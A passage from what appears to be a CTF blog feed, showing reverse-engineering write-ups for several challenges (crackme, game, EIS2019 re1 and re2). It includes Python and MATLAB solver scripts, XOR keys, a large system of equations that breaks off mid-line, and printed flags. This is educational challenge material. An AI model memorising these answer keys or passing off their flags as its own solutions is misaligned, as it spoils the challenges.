class="number">0x1B</span>,<span class="number">0x1A</span>,<span class="number">0x19</span>,<span class="number">0x18</span>,<span class="number">0x17</span>,<span class="number">0x16</span>,<span class="number">0x15</span>,<span class="number">0x14</span>,<span class="number">0x13</span>,<span class="number">0x12</span>,<span class="number">0x11</span>,</span><br><span class="line"></span><br><span class="line"><span class="number">0x10</span>,<span class="number">0x0F</span>,<span class="number">0x0E</span>,<span class="number">0x0D</span>,<span class="number">0x0C</span>,<span class="number">0x0B</span>,<span class="number">0x0A</span>,<span class="number">0x09</span>,<span class="number">0x08</span>,<span class="number">0x07</span>,<span class="number">0x00</span>,<span class="number">0x01</span>,<span class="number">0x02</span>,<span class="number">0x03</span>,<span class="number">0x04</span>,<span class="number">0x05</span>,</span><br><span class="line"></span><br><span class="line"><span class="number">0x06</span>,<span class="number">0x07</span>,<span class="number">0x08</span>,<span class="number">0x09</span>,<span class="number">0x0A</span>,<span class="number">0x0B</span>,<span class="number">0x0C</span>,<span class="number">0x0D</span>,<span class="number">0x0E</span>,<span class="number">0x0F</span>,<span class="number">0x10</span>,<span class="number">0x11</span>,<span class="number">0x12</span>,<span class="number">0x13</span>,<span class="number">0x14</span>,<span class="number">0x15</span>,</span><br><span class="line"></span><br><span class="line"><span class="number">0x16</span>,<span class="number">0x17</span>,<span class="number">0x18</span>,<span class="number">0x19</span>,<span class="number">0x31</span>,<span class="number">0x30</span>,<span class="number">0x2F</span>,<span class="number">0x2E</span>,<span class="number">0x2D</span>,<span class="number">0x2C</span>,<span class="number">0x2B</span>,<span class="number">0x2A</span>,<span class="number">0x29</span>,<span class="number">0x28</span>,<span class="number">0x36</span>,<span class="number">0x32</span>]</span><br><span class="line"></span><br><span class="line">j=<span class="number">0</span></span><br><span class="line"></span><br><span class="line">a2=<span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">'artqkoehqpkbihv'</span>:</span><br><span class="line"></span><br><span class="line">tmp=ord(i)<span class="number">-97</span></span><br><span class="line"></span><br><span class="line">guess1=tmp+<span class="number">97</span>-v3[j]</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> chr(guess1)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="number">97</span>&lt;=guess1 <span class="keyword">and</span> guess1 &lt;=<span class="number">122</span>):</span><br><span class="line"></span><br><span class="line">a2+=chr(guess1)</span><br><span class="line"></span><br><span class="line">j=j+<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="number">97</span>&lt;=guess1+<span class="number">26</span> <span class="keyword">and</span> guess1+<span class="number">26</span> &lt;=<span class="number">122</span>):</span><br><span class="line"></span><br><span class="line">a2+=chr(guess1+<span class="number">26</span>)</span><br><span class="line"></span><br><span class="line">j=j+<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="number">97</span>&lt;=guess1+<span class="number">226</span> <span class="keyword">and</span> guess1+<span class="number">226</span> &lt;=<span class="number">122</span>):</span><br><span class="line"></span><br><span class="line">a2+=chr(guess1+<span class="number">2</span>*<span class="number">26</span>)</span><br><span class="line"></span><br><span class="line">j=j+<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="number">97</span>&lt;=guess1+<span class="number">326</span> <span class="keyword">and</span> guess1+<span class="number">326</span> &lt;=<span class="number">122</span>):</span><br><span class="line"></span><br><span class="line">a2+=chr(guess1+<span class="number">3</span>*<span class="number">26</span>)</span><br><span class="line"></span><br><span class="line">j=j+<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> a2</span><br></pre></td></tr></table></figure><p>flag:umpnineissogood</p><h3 id="game"><a href="#game" class="headerlink" title="game"></a>game</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">flag=<span class="string">'4693641762894685722843556137219876255986'</span></span><br><span class="line"><span class="comment">#print len(flag)</span></span><br><span class="line">flag1=[]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(flag)):</span><br><span class="line">tmp=ord(flag[i])+<span class="number">20</span></span><br><span class="line">flag1.append(tmp&amp;<span class="number">0xf3</span> | (<span class="number">0xffffffff</span>^tmp)&amp;<span class="number">0xc</span>)</span><br><span class="line"><span class="comment">#for i in flag1:</span></span><br><span class="line"><span class="comment">#print chr(i)</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(flag),<span class="number">2</span>):</span><br><span class="line">tmp=flag1[i]</span><br><span class="line">flag1[i]=flag1[i+<span class="number">1</span>]</span><br><span class="line">flag1[i+<span class="number">1</span>]=tmp</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(flag)/<span class="number">2</span>):</span><br><span class="line">tmp=flag1[i+<span class="number">20</span>]</span><br><span class="line">flag1[i+<span class="number">20</span>]=flag1[i]</span><br><span class="line">flag1[i]=tmp</span><br><span class="line">flag2=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> flag1:</span><br><span class="line">flag2+=chr(i)</span><br><span class="line"><span class="keyword">print</span> flag2</span><br><span class="line"><span class="string">'KDEEIFGKIJ@AFGEJAEF@FDKADFGIJFA@FDE@JG@J'</span></span><br></pre></td></tr></table></figure><p>flag:KDEEIFGKIJ@AFGEJAEF@FDKADFGIJFA@FDE@JG@J</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[TOC]&lt;/p&gt;
&lt;h2 id=&quot;Re&quot;&gt;&lt;a href=&quot;#Re&quot; class=&quot;headerlink&quot; title=&quot;Re&quot;&gt;&lt;/a&gt;Re&lt;/h2&gt;&lt;h3 id=&quot;crackme&quot;&gt;&lt;a href=&quot;#crackme&quot; class=&quot;headerlink&quot; title</summary>
      
    
    
    
    <category term="ctf writeup" scheme="http://pidanxu.github.io/categories/ctf-writeup/"/>
    
    
    <category term="reverse" scheme="http://pidanxu.github.io/tags/reverse/"/>
    
  </entry>
  
  <entry>
    <title>EIS2019</title>
    <link href="http://pidanxu.github.io/2019/11/21/EIS2019/"/>
    <id>http://pidanxu.github.io/2019/11/21/EIS2019/</id>
    <published>2019-11-21T10:14:38.000Z</published>
    <updated>2019-11-27T13:25:39.854Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h2 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h2><h3 id="re1"><a href="#re1" class="headerlink" title="re1"></a>re1</h3><p>把检测断点和ptrace的代码nop了，然后动态跟进去，发现最后输入和以下数组进行异或</p><p>0xc,0x1,0x33,0x2f,0x7a,0x7c,0xe0,0x00,0x3,0x7a,0x73,0x4e,0x88,0x6d,0xd2,0xcc</p><p>最后做一个倒序，和以下密文进行比较</p><p>0xFF,0xE1,0x5F, 0xD7, 0x25, 0x10, 0x13, 0x71, 0x74, 0xBF, 0x19,0x16, 0x5F, 0x5E, 0x30, 0x7F</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">c=[<span class="number">0xFF</span>,<span class="number">0xE1</span>,<span class="number">0x5F</span>, <span class="number">0xD7</span>, <span class="number">0x25</span>, <span class="number">0x10</span>, <span class="number">0x13</span>, <span class="number">0x71</span>, <span class="number">0x74</span>, <span class="number">0xBF</span>, <span class="number">0x19</span>,<span class="number">0x16</span>, <span class="number">0x5F</span>, <span class="number">0x5E</span>, <span class="number">0x30</span>, <span class="number">0x7F</span>]</span><br><span class="line">key=[<span class="number">0xc</span>,<span class="number">0x1</span>,<span class="number">0x33</span>,<span class="number">0x2f</span>,<span class="number">0x7a</span>,<span class="number">0x7c</span>,<span class="number">0xe0</span>,<span class="number">0x00</span>,<span class="number">0x3</span>,<span class="number">0x7a</span>,<span class="number">0x73</span>,<span class="number">0x4e</span>,<span class="number">0x88</span>,<span class="number">0x6d</span>,<span class="number">0xd2</span>,<span class="number">0xcc</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>):</span><br><span class="line"><span class="keyword">print</span> chr(key[i]^c[<span class="number">15</span>-i])</span><br></pre></td></tr></table></figure><h3 id="re2"><a href="#re2" class="headerlink" title="re2"></a>re2</h3><p>解方程组，matlab代码如下</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">syms a10 a11 a12  a13 a14 a15 a16 a17 a18 a19 a110 a111 a112 a113 a114 a115  a116  a117 a118 a119 a120 a121 a122 a123 a124 a125 a126 a127 a128  a129 a130 a131 </span><br><span class="line">e1=<span class="number">37027</span> * a130+ <span class="number">50244</span> * a128+ <span class="number">37157</span> * a127+ <span class="number">58180</span> * a124+ <span class="number">1513</span> * a123+ <span class="number">39390</span> * a122+ <span class="number">29470</span> * a119+ <span class="number">44970</span> * a118+ <span class="number">48734</span> * a116+ <span class="number">2139</span> * a115+ <span class="number">45204</span> * a111+ <span class="number">35081</span> * a110+ <span class="number">39591</span> * a19+ <span class="number">47551</span> * a17+ <span class="number">20069</span> * a16+ <span class="number">45266</span> * a15+ <span class="number">22432</span> * a14+ <span class="number">44493</span> *  a10- <span class="number">326</span> * a11- <span class="number">57451</span> * a12- <span class="number">18424</span> * a13- <span class="number">3751</span> * a18- <span class="number">6984</span> * a112- <span class="number">9410</span> * a113- <span class="number">54261</span> * a114- <span class="number">62111</span> * a117- <span class="number">20305</span> * a120- <span class="number">33120</span> * a121- <span class="number">11160</span> * a125- <span class="number">24198</span> * a126- <span class="number">1646</span> * a129- <span class="number">13318</span> * a131 - <span class="number">34771791</span></span><br><span class="line">e2=<span class="number">12535</span> * a130+ <span class="number">50109</span> * a125+ <span class="number">48594</span> * a122+ <span class="number">11260</span> * a121+ <span class="number">51548</span> * a120+ <span class="number">26720</span> * a118+ <span class="number">9187</span> * a116+ <span class="number">28702</span> * a114+ <span class="number">9624</span> * a113+ <span class="number">21730</span> * a111+ <span class="number">46114</span> * a19+ <span class="number">32499</span> * a18+ <span class="number">11900</span> * a15+ <span class="number">22008</span> * a14+ <span class="number">48560</span> * a12+ <span class="number">-54741</span> *  a10- <span class="number">3606</span> * a11- <span class="number">45416</span> * a13- <span class="number">24275</span> * a16- <span class="number">64371</span> * a17- <span class="number">25714</span> * a110- <span class="number">56673</span> * a112- <span class="number">39430</span> * a115- <span class="number">35779</span> * a117- <span class="number">15144</span> * a119- <span class="number">45050</span> * a123- <span class="number">59016</span> * a124- <span class="number">29262</span> * a126- <span class="number">55650</span> * a127- <span class="number">29492</span> * a128- <span class="number">13828</span> * a129+ <span class="number">40522</span> * a131 +<span class="number">9451883</span></span><br><span class="line">e3=<span class="number">12097</span> * a130+ <span class="number">57988</span> * a128+ <span class="number">52683</span> * a127+ <span class="number">31675</span> * a126+ <span class="number">57822</span> * a125+ <span class="number">29817</span> * a122+ <span class="number">53780</span> * a121+ <span class="number">3541</span> * a120+ <span class="number">20331</span> * a119+ <span class="number">32755</span> * a116+ <span class="number">43681</span> * a115+ <span class="number">20144</span> * a114+ <span class="number">2665</span> * a111+ <span class="number">64858</span> * a110+ <span class="number">63538</span> * a19+ <span class="number">19362</span> * a17+ <span class="number">5819</span> * a15+ <span class="number">15266</span> * a14+ <span class="number">54532</span> * a13+ <span class="number">17703</span> *  a10- <span class="number">16114</span> * a11- <span class="number">24359</span> * a12- <span class="number">33999</span> * a16- <span class="number">58904</span> * a18- <span class="number">11844</span> * a112- <span class="number">29623</span> * a113- <span class="number">42532</span> * a117- <span class="number">60912</span> * a118- <span class="number">4711</span> * a123- <span class="number">56853</span> * a124- <span class="number">33486</span> * a129+ <span class="number">24590</span> * a131 - <span class="number">29782736</span></span><br><span class="line">e4=<span class="number">51792</span> * a130+ <span class="number">36741</span> * a129+ <span class="number">32393</span> * a128+ <span class="number">59561</span> * a127+ <span class="number">48151</span> * a118+ <span class="number">37522</span> * a117+ <span class="number">28232</span> * a115+ <span class="number">2783</span> * a112+ <span class="number">28</span> * a111+ <span class="number">27013</span> * a110+ <span class="number">24960</span> * a19+ <span class="number">42702</span> * a17+ <span class="number">17219</span> * a15+ <span class="number">41149</span> * a14+ <span class="number">3430</span> * a13+ <span class="number">24247</span> *  a10+ <span class="number">64898</span> * a11- <span class="number">24733</span> * a12- <span class="number">16545</span> * a16- <span class="number">1315</span> * a18- <span class="number">15867</span> * a113- <span class="number">12126</span> * a114- <span class="number">3823</span> * a116- <span class="number">20727</span> * a119- <span class="number">12037</span> * a120- <span class="number">9347</span> * a121- <span class="number">39338</span> * a122- <span class="number">50524</span> * a123- <span class="number">38675</span> * a124- <span class="number">26114</span> * a125- <span class="number">4975</span> * a126- <span class="number">24297</span> * a131 - <span class="number">27959979</span></span><br><span class="line">e5=<span class="number">64702</span> * a130+ <span class="number">13289</span> * a129+ <span class="number">25143</span> * a128+ <span class="number">35562</span> * a126+ <span class="number">54655</span> * a125+ <span class="number">26782</span> * a121+ <span class="number">3079</span> * a119+ <span class="number">52035</span> * a118+ <span class="number">62825</span> * a117+ <span class="number">57738</span> * a116+ <span class="number">5380</span> * a115+ <span class="number">64221</span> * a112+ <span class="number">41251</span> * a18+ <span class="number">15294</span> * a12+ <span class="number">-32261</span> *  a10- <span class="number">54551</span> * a11- <span class="number">61664</span> * a13- <span class="number">40648</span> * a14- <span class="number">12277</span> * a15- <span class="number">55300</span> * a16- <span class="number">63212</span> * a17- <span class="number">45548</span> * a19- <span class="number">22362</span> * a110- <span class="number">32993</span> * a111- <span class="number">43046</span> * a113- <span class="number">40770</span> * a114- <span class="number">7119</span> * a120- <span class="number">36194</span> * a122- <span class="number">56102</span> * a123- <span class="number">19468</span> * a124- <span class="number">59856</span> * a127+ <span class="number">23822</span> * a131 +<span class="number">10644544</span></span><br><span class="line">e6=<span class="number">5977</span> * a130+ <span class="number">63681</span> * a124+ <span class="number">6461</span> * a123+ <span class="number">43924</span> * a119+ <span class="number">9886</span> * a118+ <span class="number">22558</span> * a117+ <span class="number">8314</span> * a116+ <span class="number">47577</span> * a114+ <span class="number">43847</span> * a113+ <span class="number">32583</span> * a110+ <span class="number">30627</span> * a18+ <span class="number">47843</span> * a17+ <span class="number">33702</span> * a13+ <span class="number">60965</span> * a12+ <span class="number">-9407</span> * a10+ <span class="number">64048</span> * a11- <span class="number">12654</span> * a14- <span class="number">56126</span> * a15- <span class="number">47366</span> * a16- <span class="number">29056</span> * a19- <span class="number">50822</span> * a111- <span class="number">6240</span> * a112- <span class="number">12371</span> * a115- <span class="number">23282</span> * a120- <span class="number">13137</span> * a121- <span class="number">13716</span> * a122- <span class="number">43391</span> * a125- <span class="number">37217</span> * a126- <span class="number">43714</span> * a127- <span class="number">55909</span> * a128- <span class="number">62806</span> * a129+ <span class="number">36688</span> * a131 - <span class="number">230179</span></span><br><span class="line">e7=<span class="number">26401</span> * a130+ <span class="number">49426</span> * a129+ <span class="number">13407</span> * a128+ <span class="number">58093</span> * a127+ <span class="number">44955</span> * a126+ <span class="number">36904</span> * a125+ <span class="number">5856</span> * a123+ <span class="number">47030</span> * a122+ <span class="number">23917</span> * a120+ <span class="number">40389</span> * a118+ <span class="number">46343</span> * a116+ <span class="number">63390</span> * a114+ <span class="number">54218</span> * a19+ <span class="number">16024</span> * a18+ <span class="number">44459</span> * a16+ <span class="number">57144</span> * a15+ <span class="number">2565</span> * a14+ <span class="number">20301</span> * a12+ <span class="number">-23136</span> * a10+ <span class="number">47281</span> * a11- <span class="number">61441</span> * a13- <span class="number">31365</span> * a17- <span class="number">56894</span> * a110- <span class="number">52977</span> * a111- <span class="number">39404</span> * a112- <span class="number">63477</span> * a113- <span class="number">22773</span> * a115- <span class="number">50258</span> * a117- <span class="number">25970</span> * a119- <span class="number">56685</span> * a121- <span class="number">55893</span> * a124- <span class="number">25199</span> * a131 - <span class="number">15871572</span></span><br><span class="line">e8=<span class="number">22198</span> * a127+ <span class="number">41681</span> * a126+ <span class="number">53436</span> * a125+ <span class="number">11269</span> * a124+ <span class="number">15201</span> * a123+ <span class="number">14952</span> * a121+ <span class="number">58351</span> * a120+ <span class="number">1742</span> * a118+ <span class="number">7881</span> * a116+ <span class="number">18373</span> * a115+ <span class="number">50053</span> * a113+ <span class="number">3911</span> * a111+ <span class="number">15341</span> * a110+ <span class="number">42663</span> * a16+ <span class="number">22400</span> * a14+ <span class="number">4696</span> * a13+ <span class="number">18654</span> * a12+ <span class="number">62577</span> *  a10+ <span class="number">23069</span> * a11- <span class="number">16178</span> * a15- <span class="number">34941</span> * a17- <span class="number">50803</span> * a18- <span class="number">28229</span> * a19- <span class="number">45565</span> * a112- <span class="number">45774</span> * a114- <span class="number">28140</span> * a117- <span class="number">29986</span> * a119- <span class="number">40067</span> * a122- <span class="number">63863</span> * a128- <span class="number">50393</span> * a129- <span class="number">14615</span> * a130+ <span class="number">16722</span> * a131 - <span class="number">12844672</span></span><br><span class="line">e9=<span class="number">17326</span> * a130+ <span class="number">5750</span> * a127+ <span class="number">34037</span> * a125+ <span class="number">40581</span> * a124+ <span class="number">35119</span> * a122+ <span class="number">29560</span> * a121+ <span class="number">54431</span> * a117+ <span class="number">40135</span> * a114+ <span class="number">7362</span> * a111+ <span class="number">31888</span> * a110+ <span class="number">37963</span> * a13+ <span class="number">910</span> * a12+ <span class="number">-39728</span> *  a10+ <span class="number">57392</span> * a11- <span class="number">2274</span> * a14- <span class="number">61995</span> * a15- <span class="number">43938</span> * a16- <span class="number">12412</span> * a17- <span class="number">10642</span> * a18- <span class="number">10303</span> * a19- <span class="number">16356</span> * a112- <span class="number">615</span> * a113- <span class="number">11314</span> * a115- <span class="number">17185</span> * a116- <span class="number">61134</span> * a118- <span class="number">4620</span> * a119- <span class="number">4591</span> * a120- <span class="number">51958</span> * a123- <span class="number">65066</span> * a126- <span class="number">6232</span> * a128- <span class="number">60002</span> * a129+ <span class="number">30503</span> * a131 +<span class="number">7906855</span></span><br><span class="line">e10=<span class="number">31106</span> * a129+ <span class="number">2313</span> * a125+ <span class="number">32582</span> * a124+ <span class="number">61335</span> * a119+ <span class="number">50686</span> * a116+ <span class="number">27537</span> * a115+ <span class="number">58190</span> * a113+ <span class="number">25366</span> * a112+ <span class="number">56260</span> * a111+ <span class="number">6483</span> * a110+ <span class="number">61315</span> * a16+ <span class="number">48180</span> * a12+ <span class="number">-16296</span> * a10- <span class="number">8786</span> * a11- <span class="number">65236</span> * a13- <span class="number">48383</span> * a14- <span class="number">32713</span> * a15- <span class="number">58771</span> * a17- <span class="number">47593</span> * a18- <span class="number">14512</span> * a19- <span class="number">60203</span> * a114- <span class="number">7295</span> * a117- <span class="number">3885</span> * a118- <span class="number">39212</span> * a120- <span class="number">40687</span> * a121- <span class="number">19258</span> * a122- <span class="number">57463</span> * a123- <span class="number">24504</span> * a126- <span class="number">11629</span> * a127- <span class="number">8917</span> * a128- <span class="number">4535</span> * a130+ <span class="number">38212</span> * a131 +<span class="number">5359162</span></span><br><span class="line">e11=<span class="number">33683</span> * a128+ <span class="number">48721</span> * a127+ <span class="number">59096</span> * a126+ <span class="number">17103</span> * a125+ <span class="number">13203</span> * a124+ <span class="number">51928</span> * a123+ <span class="number">33264</span> * a122+ <span class="number">39538</span> * a120+ <span class="number">30153</span> * a118+ <span class="number">35247</span> * a116+ <span class="number">528</span> * a115+ <span class="number">6847</span> * a113+ <span class="number">18706</span> * a112+ <span class="number">35320</span> * a111+ <span class="number">3265</span> * a110+ <span class="number">11413</span> * a19+ <span class="number">51102</span> * a17+ <span class="number">39253</span> * a16+ <span class="number">63683</span> * a15+ <span class="number">25689</span> * a13+ <span class="number">-31610</span> * a10+ <span class="number">52623</span> * a11- <span class="number">35005</span> * a12- <span class="number">9320</span> * a14- <span class="number">16508</span> * a18- <span class="number">55110</span> * a114- <span class="number">63180</span> * a117- <span class="number">13666</span> * a119- <span class="number">49046</span> * a121- <span class="number">42949</span> * a129- <span class="number">60950</span> * a130+ <span class="number">26096</span> * a131 - <span class="number">34815239</span></span><br><span class="line">e12=<span class="number">49588</span> * a130+ <span class="number">61328</span> * a128+ <span class="number">5176</span> * a123+ <span class="number">50390</span> * a122+ <span class="number">21307</span> * a121+ <span class="number">46709</span> * a120+ <span class="number">28722</span> * a119+ <span class="number">3656</span> * a117+ <span class="number">15786</span> * a116+ <span class="number">21116</span> * a115+ <span class="number">49637</span> * a114+ <span class="number">45466</span> * a112+ <span class="number">30791</span> * a110+ <span class="number">59808</span> * a19+ <span class="number">15859</span> * a18+ <span class="number">6146</span> * a17+ <span class="number">47557</span> *  a10+ <span class="number">52902</span> * a11- <span class="number">12806</span> * a12- <span class="number">59773</span> * a13- <span class="number">9182</span> * a14- <span class="number">57417</span> * a15- <span class="number">18447</span> * a16- <span class="number">54963</span> * a111- <span class="number">61599</span> * a113- <span class="number">18454</span> * a118- <span class="number">30277</span> * a124- <span class="number">25544</span> * a125- <span class="number">17882</span> * a126- <span class="number">25149</span> * a127- <span class="number">17363</span> * a129+ <span class="number">21848</span> * a131 - <span class="number">23582278</span></span><br><span class="line">e13=<span class="number">18191</span> * a130+ <span class="number">58284</span> * a127+ <span class="number">4680</span> * a125+ <span class="number">42417</span> * a124+ <span class="number">36604</span> * a120+ <span class="number">54770</span> * a119+ <span class="number">33925</span> * a115+ <span class="number">45365</span> * a113+ <span class="number">12457</span> * a112+ <span class="number">38339</span> * a111+ <span class="number">42505</span> * a19+ <span class="number">29438</span> * a18+ <span class="number">60503</span> * a17+ <span class="number">5104</span> * a14+ <span class="number">59129</span> * a13+ <span class="number">37688</span> * a10+ <span class="number">23309</span> * a11- <span class="number">2616</span> * a12- <span class="number">12561</span> * a15- <span class="number">3215</span> * a16- <span class="number">49703</span> * a110- <span class="number">15471</span> * a114- <span class="number">23447</span> * a116- <span class="number">50859</span> * a117- <span class="number">86</span> * a118- <span class="number">3773</span> * a121- <span class="number">9573</span> * a122- <span class="number">25835</span> * a123- <span class="number">20107</span> * a126- <span class="number">45915</span> * a128- <span class="number">56171</span> * a129+ <span class="number">29164</span> * a131 - <span class="number">30273764</span></span><br><span class="line">e14=<span class="number">64657</span> * a130+ <span class="number">49705</span> * a127+ <span class="number">5149</span> * a126+ <span class="number">16127</span> * a125+ <span class="number">29867</span> * a122+ <span class="number">50998</span> * a121+ <span class="number">13714</span> * a119+ <span class="number">18867</span> * a114+ <span class="number">19385</span> * a113+ <span class="number">38458</span> * a111+ <span class="number">12962</span> * a110+ <span class="number">24700</span> * a19+ <span class="number">50206</span> * a15+ <span class="number">56918</span> * a13+ <span class="number">20452</span> * a10+ <span class="number">18062</span> * a11- <span class="number">56424</span> * a12- <span class="number">10457</span> * a14- <span class="number">12288</span> * a16- <span class="number">54591</span> * a17- <span class="number">44777</span> * a18- <span class="number">52078</span> * a112- <span class="number">9805</span> * a115- <span class="number">48011</span> * a116- <span class="number">27363</span> * a117- <span class="number">20890</span> * a118- <span class="number">788</span> * a120- <span class="number">7954</span> * a123- <span class="number">34056</span> * a124- <span class="number">34732</span> * a128- <span class="number">54092</span> * a129+ <span class="number">35416</span> * a131 - <span class="number">7501764</span></span><br><span class="line">e15=<span class="number">44968</span> * a130+ <span class="number">41644</span> * a126+ <span class="number">24333</span> * a125+ <span class="number">40656</span> * a123+ <span class="number">37330</span> * a122+ <span class="number">52431</span> * a120+ <span class="number">18903</span> * a119+ <span class="number">42329</span> * a116+ <span class="number">40645</span> * a113+ <span class="number">8191</span> * a18+ <span class="number">21330</span> * a15+ <span class="number">1951</span> * a12+ <span class="number">-39611</span> * a10+ <span class="number">25246</span> * a11- <span class="number">37145</span> * a13- <span class="number">3824</span> * a14- <span class="number">49145</span> * a16- <span class="number">43603</span> * a17- <span class="number">60671</span> * a19- <span class="number">53032</span> * a110- <span class="number">48392</span> * a111- <span class="number">15417</span> * a112- <span class="number">13059</span> * a114- <span class="number">58653</span> * a115- <span class="number">51631</span> * a117- <span class="number">50173</span> * a118- <span class="number">44904</span> * a121- <span class="number">34380</span> * a124- <span class="number">18100</span> * a127- <span class="number">57765</span> * a128- <span class="number">64534</span> * a129- <span class="number">26760</span> * a131 +<span class="number">35816639</span></span><br><span class="line">e16=<span class="number">28579</span> * a130+ <span class="number">34688</span> * a129+ <span class="number">29438</span> * a127+ <span class="number">44211</span> * a124+ <span class="number">57593</span> * a121+ <span class="number">7046</span> * a119+ <span class="number">39526</span> * a118+ <span class="number">17545</span> * a117+ <span class="number">61374</span> * a116+ <span class="number">15405</span> * a115+ <span class="number">30392</span> * a114+ <span class="number">19579</span> * a112+ <span class="number">47959</span> * a111+ <span class="number">23926</span> * a19+ <span class="number">43929</span> * a15+ <span class="number">53538</span> * a13+ <span class="number">45166</span> * a12+ <span class="number">-39824</span> * a10+ <span class="number">44401</span> * a11- <span class="number">2540</span> * a14- <span class="number">54452</span> * a16- <span class="number">11199</span> * a17- <span class="number">19801</span> * a18- <span class="number">13592</span> * a110- <span class="number">29922</span> * a113- <span class="number">34144</span> * a120- <span class="number">5305</span> * a122- <span class="number">46917</span> * a123- <span class="number">4511</span> * a125- <span class="number">23881</span> * a126- <span class="number">39081</span> * a128+ <span class="number">3296</span> * a131 - <span class="number">30983928</span></span><br><span class="line">e17=<span class="number">40454</span> * a130+ <span class="number">64380</span> * a129+ <span class="number">41415</span> * a127+ <span class="number">8487</span> * a122+ <span class="number">49381</span> * a119+ <span class="number">7959</span> * a118+ <span class="number">36587</span> * a116+ <span class="number">24510</span> * a115+ <span class="number">6928</span> * a114+ <span class="number">60087</span> * a17+ <span class="number">59815</span> * a15+ <span class="number">15203</span> * a12+ <span class="number">62215</span> * a10+ <span class="number">19566</span> * a11- <span class="number">30340</span> * a13- <span class="number">15964</span> * a14- <span class="number">13939</span> * a16- <span class="number">43008</span> * a18- <span class="number">44925</span> * a19- <span class="number">49239</span> * a110- <span class="number">40498</span> * a111- <span class="number">54453</span> * a112- <span class="number">33557</span> * a113- <span class="number">24721</span> * a117- <span class="number">21456</span> * a120- <span class="number">40311</span> * a121- <span class="number">61111</span> * a123- <span class="number">18918</span> * a124- <span class="number">33393</span> * a125- <span class="number">9301</span> * a126- <span class="number">61619</span> * a128+ <span class="number">58498</span> * a131 +<span class="number">4472687</span></span><br><span class="line">e18=<span class="number">2766</span> * a129+ <span class="number">14305</span> * a128+ <span class="number">10809</span> * a126+ <span class="number">6578</span> * a124+ <span class="number">53612</span> * a123+ <span class="number">36333</span> * a121+ <span class="number">30380</span> * a120+ <span class="number">3633</span> * a119+ <span class="number">35027</span> * a118+ <span class="number">62097</span> * a115+ <span class="number">39085</span> * a114+ <span class="number">21483</span> * a113+ <span class="number">43131</span> * a111+ <span class="number">5725</span> * a19+ <span class="number">40291</span> * a18+ <span class="number">63291</span> * a15+ <span class="number">57560</span> * a14+ <span class="number">40977</span> * a13+ <span class="number">33894</span> * a12+ <span class="number">35423</span> * a10- <span class="number">12994</span> * a11- <span class="number">32256</span> * a16- <span class="number">23534</span> * a17- <span class="number">40660</span> * a110- <span class="number">19119</span> * a112- <span class="number">33732</span> * a116- <span class="number">63756</span> * a117- <span class="number">13528</span> * a122- <span class="number">47605</span> * a125- <span class="number">43202</span> * a127- <span class="number">42819</span> * a130- <span class="number">34232</span> * a131 - <span class="number">18523534</span></span><br><span class="line">e19=<span class="number">48054</span> * a129+ <span class="number">27903</span> * a128+ <span class="number">44427</span> * a127+ <span class="number">26215</span> * a126+ <span class="number">10136</span> * a125+ <span class="number">62674</span> * a120+ <span class="number">31419</span> * a119+ <span class="number">13647</span> * a118+ <span class="number">19761</span> * a115+ <span class="number">34155</span> * a111+ <span class="number">26302</span> * a17+ <span class="number">27559</span> * a16+ <span class="number">53130</span> * a15+ <span class="number">27162</span> * a14+ <span class="number">55103</span> * a13+ <span class="number">58838</span> * a12+ <span class="number">44942</span> * a10+ <span class="number">63420</span> * a11- <span class="number">24313</span> * a18- <span class="number">42499</span> * a19- <span class="number">21629</span> * a110- <span class="number">2633</span> * a112- <span class="number">55014</span> * a113- <span class="number">22926</span> * a114- <span class="number">305</span> * a116- <span class="number">63708</span> * a117- <span class="number">32334</span> * a121- <span class="number">47684</span> * a122- <span class="number">54226</span> * a123- <span class="number">50848</span> * 